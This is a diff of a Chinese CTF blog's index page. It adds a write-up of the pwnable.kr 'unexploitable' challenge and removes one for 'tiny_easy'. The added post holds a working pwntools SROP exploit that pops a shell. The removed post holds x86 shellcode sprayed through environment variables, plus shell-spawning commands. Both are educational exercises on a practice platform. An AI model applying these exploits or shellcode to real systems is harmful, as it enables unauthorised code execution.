@@ -318,6 +318,186 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2018/08/06/pwnable-kr-unexploitable/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="r00tnb">
+      <meta itemprop="description" content="努力学习网络安全技术，喜欢二进制，一直努力但进步甚微。">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="R00tnb's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2018/08/06/pwnable-kr-unexploitable/" itemprop="url">
+                  pwnable.kr-unexploitable
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+
+              
+                
+              
+
+              <time title="创建时间：2018-08-06 11:54:02 / 修改时间：12:17:15" itemprop="dateCreated datePublished" datetime="2018-08-06T11:54:02+08:00">2018-08-06</time>
+            
+
+            
+              
+
+              
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/08/06/pwnable-kr-unexploitable/#comments" itemprop="discussionUrl">
+                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/08/06/pwnable-kr-unexploitable/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这是一道关于<code>linux SROP</code>的题目，通过系统sigrenturn调用来控制程序流程。</p>
+<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>这道题的逻辑很简单，贴出反编译代码<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  sleep(<span class="number">3u</span>);</span><br><span class="line">  <span class="keyword">return</span> read(<span class="number">0</span>, &amp;buf, <span class="number">1295u</span>LL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>观察<code>main</code>函数，发现它有栈溢出漏洞。首先想到的利用方法是通过栈溢出修改程序流程，然后使用可读取内存的函数来leak出<code>system</code>的地址。可是通过ida发现当前的got表中并没有可以读内存的函数。<br>焦虑了一会儿，后来上网一搜，发现还有<code>linux SROP</code>的利用方法（参考<a href="https://blog.csdn.net/qq_31481187/article/details/73929569" target="_blank" rel="noopener">Linux SROP 原理与攻击</a>）。只需通过linux的sigreturn系统调用，把栈上的数据依次pop到寄存器中即可完成利用。我这里，通过该调用直接执行了<code>execve(&#39;/bin/sh&#39;)</code>获得shell。下面是exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch=<span class="string">'amd64'</span>)</span><br><span class="line">leave_addr = <span class="number">0x400576</span></span><br><span class="line">read_got = <span class="number">0x601000</span></span><br><span class="line">main_addr = <span class="number">0x400544</span></span><br><span class="line">frame_base = <span class="number">0x601028</span></span><br><span class="line">data_base = <span class="number">0x601018</span></span><br><span class="line">pop_rbp = <span class="number">0x400540</span></span><br><span class="line">gadget_1 = <span class="number">0x4005e6</span> <span class="comment">#mov rbx,[rsp+8h];mov rbp,[rsp+10h];mov r12,[rsp+18h];mov r13,[rsp+20h];\</span></span><br><span class="line">                        <span class="comment">#mov r14,[rsp+28h];mov r15,[rsp+30h];add rsp,38h;ret;......;ret</span></span><br><span class="line">gadget_2 = <span class="number">0x4005d0</span> <span class="comment">#mov rdx,r15;mov rsi,r14;mov edi,r13d;call qword ptr [r12+rbx*8]</span></span><br><span class="line">syscall_addr = <span class="number">0x400560</span> <span class="comment">#syscall</span></span><br><span class="line"><span class="comment">#r = process("./unexploitable")</span></span><br><span class="line"><span class="comment">#gdb.attach(r,"b * 0x400577")</span></span><br><span class="line"><span class="comment">#sleep(1)</span></span><br><span class="line">s = ssh(host=<span class="string">'pwnable.kr'</span>,user=<span class="string">'unexploitable'</span>,password=<span class="string">'guest'</span>,port=<span class="number">2222</span>)</span><br><span class="line">r = s.run(<span class="string">'./unexploitable'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_poc</span><span class="params">(addr,maxlen)</span>:</span></span><br><span class="line">    tmp = p64(gadget_1)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(read_got)+p64(<span class="number">0</span>)+p64(addr)+p64(maxlen)</span><br><span class="line">    tmp += p64(gadget_2)+<span class="string">'a'</span>*<span class="number">0x38</span></span><br><span class="line">    <span class="keyword">return</span> tmp</span><br><span class="line"></span><br><span class="line"><span class="comment"># write sigreturn frame</span></span><br><span class="line">frame = SigreturnFrame(kernel=<span class="string">'amd64'</span>)</span><br><span class="line">frame.rdi = data_base <span class="comment"># /bin/sh</span></span><br><span class="line">frame.rsi = <span class="number">0</span></span><br><span class="line">frame.rdx = <span class="number">0</span></span><br><span class="line">frame.rax = <span class="number">59</span></span><br><span class="line">frame.rip = syscall_addr</span><br><span class="line">poc = <span class="string">'a'</span>*<span class="number">24</span>+read_poc(frame_base,<span class="number">0x500</span>)+p64(main_addr)</span><br><span class="line">r.send(poc.ljust(<span class="number">1295</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">poc = p64(<span class="number">0</span>)+p64(syscall_addr)+str(frame)</span><br><span class="line">r.send(poc.ljust(<span class="number">0x500</span>,<span class="string">'\x00'</span>))</span><br><span class="line"></span><br><span class="line">poc = <span class="string">'a'</span>*<span class="number">24</span>+read_poc(data_base,<span class="number">15</span>)  <span class="comment"># rax = 15 &amp;&amp; write "/bin/sh" to data_base</span></span><br><span class="line">poc += p64(pop_rbp)+p64(frame_base)+p64(leave_addr) <span class="comment"># rsp =&gt; bss_base</span></span><br><span class="line">r.send(poc.ljust(<span class="number">1295</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.send(<span class="string">"/bin/sh"</span>.ljust(<span class="number">15</span>,<span class="string">'\x00'</span>))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@kali:/mnt/hgfs/work/jarvisoj# cd ../pwn-1</span><br><span class="line">root@kali:/mnt/hgfs/work/pwn-1# python unexploitable.py </span><br><span class="line">[*] Checking for new versions of pwntools</span><br><span class="line">    To disable this functionality, set the contents of /root/.pwntools-cache/update to &apos;never&apos;.</span><br><span class="line">[*] You have the latest version of Pwntools (3.12.0)</span><br><span class="line">[+] Connecting to pwnable.kr on port 2222: Done</span><br><span class="line">[!] Couldn&apos;t check security settings on &apos;pwnable.kr&apos;</span><br><span class="line">[+] Opening new channel: &apos;./unexploitable&apos;: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">$ ls</span><br><span class="line">$ flag  unexploitable  unexploitable.c</span><br><span class="line">$ $ cat flag</span><br><span class="line">sigreturn rop..? not a secret technique anymore!!</span><br><span class="line">$ $</span><br></pre></td></tr></table></figure>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>恩，又学到了新的利用方法。</p>
+
+          
+        
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2018/07/16/pwnable.kr-wtf/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2067,202 +2247,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://r00tnb.github.io/2018/02/26/pwnable.kr-tiny_easy/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="r00tnb">
-      <meta itemprop="description" content="努力学习网络安全技术，喜欢二进制，一直努力但进步甚微。">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="R00tnb's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/02/26/pwnable.kr-tiny_easy/" itemprop="url">
-                  pwnable.kr-tiny_easy
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-
-              
-                
-              
-
-              <time title="创建时间：2018-02-26 21:00:19" itemprop="dateCreated datePublished" datetime="2018-02-26T21:00:19+08:00">2018-02-26</time>
-            
-
-            
-              
-
-              
-                
-                <span class="post-meta-divider">|</span>
-                
-
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                
-                  <span class="post-meta-item-text">更新于</span>
-                
-                <time title="修改时间：2018-08-04 22:32:31" itemprop="dateModified" datetime="2018-08-04T22:32:31+08:00">2018-08-04</time>
-              
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2018/02/26/pwnable.kr-tiny_easy/#comments" itemprop="discussionUrl">
-                  <span class="post-meta-item-text">评论数：</span> <span class="post-comments-count valine-comment-count" data-xid="/2018/02/26/pwnable.kr-tiny_easy/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>考验漏洞利用能力的题目，长姿势了。参考了别人的<a href="https://blog.yiz96.com/pwnable-kr-tiny_easy/" target="_blank" rel="noopener">writeup</a></p>
-<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>没有源代码，就丢ida逆向了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">LOAD:08048054 ; Attributes: noreturn</span><br><span class="line">LOAD:08048054</span><br><span class="line">LOAD:08048054                 public start</span><br><span class="line">LOAD:08048054 start           proc near</span><br><span class="line">LOAD:08048054                 pop     eax</span><br><span class="line">LOAD:08048055                 pop     edx</span><br><span class="line">LOAD:08048056                 mov     edx, [edx]</span><br><span class="line">LOAD:08048058                 call    edx</span><br><span class="line">LOAD:08048058 start           endp ; sp-analysis failed</span><br><span class="line">LOAD:08048058</span><br><span class="line">LOAD:08048058 LOAD            ends</span><br><span class="line">LOAD:08048058</span><br><span class="line">LOAD:08048058</span><br><span class="line">LOAD:08048058                 end start</span><br></pre></td></tr></table></figure></p>
-<p>这是什么程序？？就这一点代码就什么都没了？当时也很蒙蔽，不过漏洞还是很容易看出来的。<code>call</code>调用其实是可以通过栈内数据控制的，但是栈上的数据是什么呢？丢进<code>gdb</code>看看<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">   0x8048050:	add    BYTE PTR [eax],dl</span><br><span class="line">   0x8048052:	add    BYTE PTR [eax],al</span><br><span class="line">=&gt; 0x8048054:	pop    eax</span><br><span class="line">   0x8048055:	pop    edx</span><br><span class="line">   0x8048056:	mov    edx,DWORD PTR [edx]</span><br><span class="line">   0x8048058:	call   edx</span><br><span class="line">   0x804805a:	add    BYTE PTR [eax],al</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffcf23c0 --&gt; 0x1 </span><br><span class="line">0004| 0xffcf23c4 --&gt; 0xffcf32bb (&quot;/root/桌面/test/tiny_easy&quot;)</span><br><span class="line">0008| 0xffcf23c8 --&gt; 0x0 </span><br><span class="line">0012| 0xffcf23cc --&gt; 0xffcf32db (&quot;XDG_VTNR=7&quot;)</span><br><span class="line">0016| 0xffcf23d0 --&gt; 0xffcf32e6 (&quot;XDG_SESSION_ID=c2&quot;)</span><br><span class="line">0020| 0xffcf23d4 --&gt; 0xffcf32f8 (&quot;XDG_GREETER_DATA_DIR=/var/lib/lightdm-data/gyh&quot;)</span><br><span class="line">0024| 0xffcf23d8 --&gt; 0xffcf3327 (&quot;CLUTTER_IM_MODULE=xim&quot;)</span><br><span class="line">0028| 0xffcf23dc --&gt; 0xffcf333d (&quot;GPG_AGENT_INFO=/home/gyh/.gnupg/S.gpg-agent:0:1&quot;)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x08048054 in ?? ()</span><br><span class="line">gdb-peda$</span><br></pre></td></tr></table></figure></p>
-<p>原来栈上的数据就是传入参数和环境变量的地址，接下来执行到<code>call edx</code>看看程序会转向哪儿。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x1 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0x0 </span><br><span class="line">EDX: 0x6d6f682f (&apos;/hom&apos;)</span><br><span class="line">ESI: 0x0 </span><br><span class="line">EDI: 0x0 </span><br><span class="line">EBP: 0x0 </span><br><span class="line">ESP: 0xffcf23c8 --&gt; 0x0 </span><br><span class="line">EIP: 0x8048058 (call   edx)</span><br><span class="line">EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x8048051:	adc    BYTE PTR [eax],al</span><br><span class="line">   0x8048053:	add    BYTE PTR [eax+0x5a],bl</span><br><span class="line">   0x8048056:	mov    edx,DWORD PTR [edx]</span><br><span class="line">=&gt; 0x8048058:	call   edx</span><br><span class="line">   0x804805a:	add    BYTE PTR [eax],al</span><br><span class="line">   0x804805c:	add    BYTE PTR [eax],al</span><br><span class="line">   0x804805e:	add    BYTE PTR [eax],al</span><br><span class="line">   0x8048060:	add    BYTE PTR [eax],al</span><br></pre></td></tr></table></figure></p>
-<p>可以看到<code>edx</code>的值就是第一个传入参数的前4个字节，这里是<code>/hom</code>。如果控制了这4个字节，就控制了程序的流程。<br>但是程序空间中没有调用任何函数代码，所以要getshell只有写入<code>shellcode</code>并跳转执行才可，程序能控制写入的地方只有环境变量和传入参数了，于是可以将shellcode写到这里面。但是题目平台是开启<code>ASLR</code>的，不能确定环境变量和传入参数的地址。这里可以控制程序跳转到一个大致的地址去，然后在环境变量里安排<code>[NOP][shelcode]</code>类似的shellcode，其中<code>nop</code>指令相对于<code>shellcode</code>要非常多，这样当程序执行跳转时一旦跳到<code>nop</code>覆盖的区域就会被引导至<code>shellcode</code>。<br>这个大致的地址可以选取调试时见到的值如<code>0xffcf333d</code>，<code>shellcode</code>可以用pwntools的shellcraft模块生成，于是exp如下<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入环境变量</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 500`; <span class="keyword">do</span> <span class="built_in">export</span> A_<span class="variable">$i</span>=$(python -c <span class="string">'print "\x90"*4096+"jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"'</span>);<span class="keyword">done</span>;</span><br></pre></td></tr></table></figure></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy &amp;</span><br></pre></td></tr></table></figure>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">tiny_easy@ubuntu:~$ <span class="keyword">for</span> i <span class="keyword">in</span> `seq 1 500`; <span class="keyword">do</span> <span class="built_in">export</span> A_<span class="variable">$i</span>=$(python -c <span class="string">'print "\x90"*4096+"jhh///sh/bin\x89\xe3h\x01\x01\x01\x01\x814$ri\x01\x011\xc9Qj\x04Y\x01\xe1Q\x89\xe11\xd2j\x0bX\xcd\x80"'</span>);<span class="keyword">done</span>;</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy &amp;</span><br><span class="line">[1] 30389</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">fg</span></span><br><span class="line">-bash: <span class="built_in">fg</span>: job has terminated</span><br><span class="line">[1]+  Segmentation fault      <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy &amp;</span><br><span class="line">[1] 5710</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy &amp;</span><br><span class="line">[2] 11068</span><br><span class="line">[1]   Segmentation fault      <span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy</span><br><span class="line">tiny_easy@ubuntu:~$ <span class="built_in">fg</span></span><br><span class="line"><span class="built_in">exec</span> -a $(python -c <span class="string">"print '\x3d\x33\xcf\xff'"</span>) ./tiny_easy</span><br><span class="line">$ ls</span><br><span class="line">flag  tiny_easy</span><br><span class="line">$ cat flag</span><br><span class="line">What a tiny task :) good job!</span><br><span class="line">$</span><br></pre></td></tr></table></figure>
-<p>另外，我所参考的writeup实际上还使用了<code>ulimit -s unlimited</code>关闭aslr的方法，但这个漏洞已经在题目平台修补了，可以参考<code>CVE-2016-3672</code>漏洞描述或者<a href="http://www.freebuf.com/vuls/101169.html" target="_blank" rel="noopener">这篇文章</a></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>该题漏洞的利用方法类似<code>heap spray</code>，只不过这是把<code>shellcode</code>布置在环境变量的节区上，该方法以前知道但是到了正真使用的时候却忘了，看来还是要多多练习呀。</p>
-
-          
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -2310,7 +2294,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">44</span>
+                    <span class="site-state-item-count">45</span>
                     <span class="site-state-item-name">日志</span>
                   </a>
                 </div>
@@ -2444,7 +2428,7 @@
 
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共51.3k字</span>
+  <span class="post-count">博客全站共51.9k字</span>
 </div>
         
 <div class="busuanzi-count">
